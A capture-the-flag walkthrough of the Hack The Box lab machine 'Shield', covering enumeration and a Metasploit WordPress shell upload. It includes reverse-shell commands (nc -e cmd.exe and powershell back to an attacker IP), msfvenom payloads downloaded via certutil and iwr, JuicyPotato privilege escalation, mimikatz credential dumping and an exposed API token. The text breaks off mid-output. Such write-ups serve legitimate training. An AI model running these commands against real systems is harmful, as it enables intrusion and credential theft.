HTB - Shield

1. `nmap -T4 -A -p- 10.10.10.29`
	```
	kali@kali:~$ nmap -T4 -A -p- 10.10.10.29
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 17:10 EDT
	Nmap scan report for 10.10.10.29
	Host is up (0.47s latency).
	Not shown: 65533 filtered ports
	PORT     STATE SERVICE VERSION
	80/tcp   open  http    Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	3306/tcp open  mysql   MySQL (unauthorized)
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 643.75 seconds
	```
2. Nessus scan for fun
	Start with `sudo /etc/init.d/nessusd start` and go to `https://kali:8834`
3. Enumerate HTTP
	* Ran `sudo nikto -h http://10.10.10.29`
		```
		kali@kali:~$ sudo nikto -h http://10.10.10.29
		[sudo] password for kali: 
		- Nikto v2.1.6
		---------------------------------------------------------------------------
		+ Target IP:          10.10.10.29
		+ Target Hostname:    10.10.10.29
		+ Target Port:        80
		+ Start Time:         2020-05-04 17:16:16 (GMT-4)
		---------------------------------------------------------------------------
		+ Server: Microsoft-IIS/10.0
		+ The anti-clickjacking X-Frame-Options header is not present.
		+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
		+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
		+ No CGI Directories found (use '-C all' to force check all possible dirs)
		+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
		+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
		+ 7863 requests: 0 error(s) and 5 item(s) reported on remote host
		+ End Time:           2020-05-04 18:12:15 (GMT-4) (3359 seconds)
		---------------------------------------------------------------------------
		+ 1 host(s) tested
		kali@kali:~$ sudo nikto -h http://10.10.10.29/wordpress
		[sudo] password for kali: 
		- Nikto v2.1.6
		---------------------------------------------------------------------------
		+ Target IP:          10.10.10.29
		+ Target Hostname:    10.10.10.29
		+ Target Port:        80
		+ Start Time:         2020-05-04 18:41:32 (GMT-4)
		---------------------------------------------------------------------------
		+ Server: No banner retrieved
		+ Retrieved x-powered-by header: PHP/7.1.29
		+ The anti-clickjacking X-Frame-Options header is not present.
		+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
		+ Uncommon header 'link' found, with multiple values: (<http://10.10.10.29/wordpress/index.php/wp-json/>; rel="https://api.w.org/",<http://10.10.10.29/wordpress/>; rel=shortlink,)
		+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
		+ Uncommon header 'x-redirect-by' found, with contents: WordPress
		+ No CGI Directories found (use '-C all' to force check all possible dirs)
		+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
		+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
		+ ERROR: Error limit (20) reached for host, giving up. Last error:                                                                                         
		+ Scan terminated:  3 error(s) and 8 item(s) reported on remote host                                                                                       
		+ End Time:           2020-05-04 19:11:11 (GMT-4) (1779 seconds)                                                                                           
		---------------------------------------------------------------------------                                                                                
		+ 1 host(s) tested 
		```
	* Visit `http://10.10.10.29`
		![Screenshot-20200504172102-1248x817.png](images/a7e44395f3a74fac82d9717d65d9cffc.png)
	* Subdirectory brute force with gobuster: `gobuster dir -u http://10.10.10.29/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` (other possible wordlist: `/usr/share/wordlists/dirb/common.txt`) 
		```
		===============================================================
		Gobuster v3.0.1
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
		===============================================================
		[+] Url:            http://10.10.10.29/
		[+] Threads:        200
		[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
		[+] Status codes:   200,204,301,302,307,401,403
		[+] User Agent:     gobuster/3.0.1
		[+] Timeout:        10s
		===============================================================
		2020/05/04 17:27:45 Starting gobuster
		===============================================================
		/wordpress (Status: 301)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/people: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/aboutus: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/new: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/sports: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/buttons: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/image: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/blogs: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/products: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/events: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:27:56 [!] Get http://10.10.10.29/music: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:12 [!] Get http://10.10.10.29/474: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:12 [!] Get http://10.10.10.29/Top: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:13 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
		[ERROR] 2020/05/04 17:28:15 [!] Get http://10.10.10.29/Logos: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:15 [!] Get http://10.10.10.29/infobox: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:15 [!] Get http://10.10.10.29/994: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:15 [!] Get http://10.10.10.29/777: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		[ERROR] 2020/05/04 17:28:16 [!] Get http://10.10.10.29/su: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		/WordPress (Status: 301)
		[ERROR] 2020/05/04 17:30:21 [!] Get http://10.10.10.29/category3: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
		/Wordpress (Status: 301)
		===============================================================
		2020/05/04 17:34:53 Finished
		===============================================================
		```
	* Wordpress install found at `/wordpress/`
	* Run `wpscan`:
		```
		wpscan --update
		wpscan --url 10.10.10.29/wordpress/ --api-token 4emjktvbV4Csl9u9IVTpH5uWcnXvgwJZfWSCSlu0s3g
		```
		
		Output:
		```
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.1
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://10.10.10.29/wordpress/ [10.10.10.29]
		[+] Started: Mon May  4 17:38:24 2020
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entries:
		 |  - Server: Microsoft-IIS/10.0
		 |  - X-Powered-By: PHP/7.1.29
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://10.10.10.29/wordpress/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
		
		[+] http://10.10.10.29/wordpress/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://10.10.10.29/wordpress/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://10.10.10.29/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
		 |  - http://10.10.10.29/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
		 |
		 | [!] 18 vulnerabilities identified:
		 |
		 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
		 |     Fixed in: 5.2.3
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9867
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
		 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
		 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
		 |      - https://hackerone.com/reports/339483
		 |
		 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
		 |     Fixed in: 5.2.3
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9864
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
		 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
		 |      - https://fortiguard.com/zeroday/FG-VD-18-165
		 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
		 |
		 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9908
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |
		 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9909
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
		 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
		 |
		 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9910
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |
		 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9911
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |
		 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9912
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |
		 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
		 |     Fixed in: 5.2.4
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9913
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
		 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
		 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
		 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
		 |
		 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
		 |     Fixed in: 5.2.5
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9973
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
		 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
		 |
		 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
		 |     Fixed in: 5.2.5
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9975
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
		 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
		 |      - https://hackerone.com/reports/509930
		 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
		 |
		 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
		 |     Fixed in: 5.2.5
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/9976
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
		 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
		 |
		 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
		 |     Fixed in: 5.2.5
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10004
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
		 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
		 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
		 |
		 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10201
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47634/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
		 |
		 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10202
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47635/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
		 |
		 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10203
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47633/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
		 |
		 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10204
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11030
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47636/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-vccm-6gmc-qhjh
		 |
		 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10205
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47637/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
		 |
		 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
		 |     Fixed in: 5.2.6
		 |     References:
		 |      - https://wpvulndb.com/vulnerabilities/10206
		 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
		 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
		 |      - https://core.trac.wordpress.org/changeset/47638/
		 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
		 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
		
		[i] The main theme could not be detected.
		
		[+] Enumerating All Plugins (via Passive Methods)
		[+] Checking Plugin Versions (via Passive and Aggressive Methods)
		
		[i] Plugin(s) Identified:
		
		[+] mesmerize-companion
		 | Location: http://10.10.10.29/wordpress/wp-content/plugins/mesmerize-companion/
		 | Latest Version: 1.6.111
		 | Last Updated: 2020-04-10T15:01:00.000Z
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | The version could not be determined.
		
		[+] Enumerating Config Backups (via Passive and Aggressive Methods)
		 Checking Config Backups - Time: 00:00:04 <==============================================================================> (21 / 21) 100.00% Time: 00:00:04
		
		[i] No Config Backups Found.
		
		[+] WPVulnDB API OK
		 | Plan: free
		 | Requests Done (during the scan): 2
		 | Requests Remaining: 48
		
		[+] Finished: Mon May  4 17:38:40 2020
		[+] Requests Done: 27
		[+] Cached Requests: 36
		[+] Data Sent: 6.36 KB
		[+] Data Received: 18.56 KB
		[+] Memory used: 175.391 MB
		[+] Elapsed time: 00:00:15
		```
	* Enumerate Users: `wpscan --url 10.10.10.29/wordpress/ --enumerate u`
		```
		[+] Enumerating Users (via Passive and Aggressive Methods)
		 Brute Forcing Author IDs - Time: 00:00:30 <=============================================================================> (10 / 10) 100.00% Time: 00:00:30
		
		[i] User(s) Identified:
		
		[+] admin
		 | Found By: Rss Generator (Passive Detection)
		 | Confirmed By:
		 |  Wp Json Api (Aggressive Detection)
		 |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
		 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		```
	* Bruteforce login: `wpscan --url 10.10.10.29/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50 --api-token 4emjktvbV4Csl9u9IVTpH5uWcnXvgwJZfWSCSlu0s3g`
	* Login found to be `admin:P@s5w0rd!` from last box. Go to `http://10.10.10.29/wordpress/wp-login.php` and login.
	* Searching for `metasploit wordpress` yields https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload
4. Exploit
	```
	sudo msfconsole
	msf > use exploit/unix/webapp/wp_admin_shell_upload
	msf > set PASSWORD P@s5w0rd!
	msf > set USERNAME admin
	msf > set TARGETURI /wordpress
	msf > set RHOSTS 10.10.10.29
	msf > set LPORT 443
	msf > set payload php/meterpreter_reverse_tcp
	msf > exploit
	```
	
	* Upgrade to more stable shell:
		```
		wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
		untar netcat-win32-1.12.zip
		msf > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
		sudo python3 -m http.server 80
		msf > shell
		> iwr -outf nc.exe http://10.10.14.173/nc.exe
		nc -lvp 1234
		msf > execute -f nc.exe -a "-e cmd.exe 10.10.14.173 1234"
		```
	
	* 2nd way to upgrade (much better):
		1. Change paylaod to download and execute
			```
			set payload php/download_exec
			msf > set url http://10.10.14.173/shell.exe
			```
		2. Create exploit: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.173 LPORT=443 -f exe > shell.exe`
		3. Run server: `sudo python3 -m http.server 80`
		4. Open up port to listen on:
			```
			use exploit/multi/handler
			set payload windows/meterpreter/reverse_tcp
			options
			set LHOST 10.10.15.117
			set LPORT 443
			run
			```
	
	Sysinfo:
	```
	sysinfo
	Computer    : SHIELD
	OS          : Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586
	Meterpreter : php/windows
	```

5. Privilege Escalation ([Great Tutorial for Windows](https://github.com/frizb/Windows-Privilege-Escalation))
	* Find exploit:
		* Method 1: Priv esc suggester
			```
			search suggester
			use 0
			options
			set session 1
			run
			```
			
			Result:
			```
			0.29 - Collecting local exploits for x86/windows...
			[*] 10.10.10.29 - 30 exploit checks are being tried...
			[+] 10.10.10.29 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
			[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
			[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
			[*] Post module execution completed
			```
			Result: I tried `ms16_032_secondary_logon_handle_privesc` with `x64` meterpreter after changing to `x64` shell from `32 bit` but did not work.
		* Method 2: Search for `windows server 2016 privilege escalation exploit` yields https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges which points to [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
		* Method 3: More automated searchers. **[`sherlock`](https://github.com/rasta-mouse/Sherlock) by `rastamouse`
			```
			sudo python3 -m http.server 80
			msf shell > certutil -urlcache -f http://10.10.15.117/sher.ps1 sher.ps1
			msf shell > powershell.exe -exec bypass -Command "& {Import-Module .\sher.ps1; Find-AllVulns}"
			```
			
			Output:
			```
			Title      : User Mode to Ring (KiTrap0D)
			MSBulletin : MS10-015
			CVEID      : 2010-0232
			Link       : https://www.exploit-db.com/exploits/11199/
			VulnStatus : Not supported on 64-bit systems
			
			Title      : Task Scheduler .XML
			MSBulletin : MS10-092
			CVEID      : 2010-3338, 2010-3888
			Link       : https://www.exploit-db.com/exploits/19930/
			VulnStatus : Not Vulnerable
			
			Title      : NTUserMessageCall Win32k Kernel Pool Overflow
			MSBulletin : MS13-053
			CVEID      : 2013-1300
			Link       : https://www.exploit-db.com/exploits/33213/
			VulnStatus : Not supported on 64-bit systems
			
			Title      : TrackPopupMenuEx Win32k NULL Page
			MSBulletin : MS13-081
			CVEID      : 2013-3881
			Link       : https://www.exploit-db.com/exploits/31576/
			VulnStatus : Not supported on 64-bit systems
			
			Title      : TrackPopupMenu Win32k Null Pointer Dereference
			MSBulletin : MS14-058
			CVEID      : 2014-4113
			Link       : https://www.exploit-db.com/exploits/35101/
			VulnStatus : Not Vulnerable
			
			Title      : ClientCopyImage Win32k
			MSBulletin : MS15-051
			CVEID      : 2015-1701, 2015-2433
			Link       : https://www.exploit-db.com/exploits/37367/
			VulnStatus : Not Vulnerable
			
			Title      : Font Driver Buffer Overflow
			MSBulletin : MS15-078
			CVEID      : 2015-2426, 2015-2433
			Link       : https://www.exploit-db.com/exploits/38222/
			VulnStatus : Not Vulnerable
			
			Title      : 'mrxdav.sys' WebDAV
			MSBulletin : MS16-016
			CVEID      : 2016-0051
			Link       : https://www.exploit-db.com/exploits/40085/
			VulnStatus : Not supported on 64-bit systems
			
			Title      : Secondary Logon Handle
			MSBulletin : MS16-032
			CVEID      : 2016-0099
			Link       : https://www.exploit-db.com/exploits/39719/
			VulnStatus : Not Vulnerable
			
			Title      : Windows Kernel-Mode Drivers EoP
			MSBulletin : MS16-034
			CVEID      : 2016-0093/94/95/96
			Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
			             6-034?
			VulnStatus : Not Vulnerable
			
			Title      : Win32k Elevation of Privilege
			MSBulletin : MS16-135
			CVEID      : 2016-7255
			Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
			             ample-Exploits/MS16-135
			VulnStatus : Not Vulnerable
			
			Title      : Nessus Agent 6.6.2 - 6.10.3
			MSBulletin : N/A
			CVEID      : 2017-7199
			Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
			             tml
			VulnStatus : Not Vulnerable
			```
			Result: Not vulnerable
			
			Trying [pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check):
			```
			wget https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe
			sudo python3 -m http.server 80
			msf shell > certutil -urlcache -f http://10.10.15.117/windows-privesc-check2.exe ex.exe
			msf shell > ex.exe --audit -a -o report -v
			```
			
			Trying [411Hall/JAWS](https://github.com/411Hall/JAWS):
			```
			wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1
			sudo python3 -m http.server 80
			msf shell > certutil -urlcache -f http://10.10.15.117/jaws-enum.ps1 jaws.ps1
			msf shell > powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1
			msf shell > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt"
			```
			
	* "Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the `SeAssignPrimaryToken` or `SeImpersonate` privilege in a MiTM attack."
	* CLSID List: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard
	* Manual Escalation
		```
		wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
		sudo python3 -m http.server 80
		msf > shell
		msf > powershell
		msf > iwr -outf js.exe http://10.10.14.173/JuicyPotato.exe
		```
		```
		echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.173 1111 > shell.bat
		js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337 -c {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}
		```
	* Automatic Escalation
		```
		msf > background
		msf > search ms16_075
		msf > use exploit/windows/local/ms16_075_reflection_juicy
		msf > set payload windows/meterpreter/reverse_tcp
		msf > set session 1
		msf > set lhost 10.10.14.173
		msf > set dcom_port 1337
		msf > set CLSID {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}
		msf > set lport 8464
		msf > run
		```
		Result: `Server username: NT AUTHORITY\SYSTEM`
	
	```
	cd C:\Users\Administrator\Desktop
	cat root.txt
	```
	**Root Flag:** `6e9a9fdc6f64e410a68b847bb4b404fa`

6. Post Exploitation
	* Convert to x64 shell:
		```
		use post/windows/manage/archmigrate
		set session 2
		set IGNORE_SYSTEM true
		```
	* Get passwords
		```
		load kiwi
		meterpreter > kiwi_cmd sekurlsa::logonpasswords
		```
		
		Output:
		```
		Authentication Id : 0 ; 298603 (00000000:00048e6b)
		Session           : Interactive from 1
		User Name         : sandra
		Domain            : MEGACORP
		Logon Server      : PATHFINDER
		Logon Time        : 5/4/2020 10:20:27 PM
		SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
		        msv :
		         [00000003] Primary
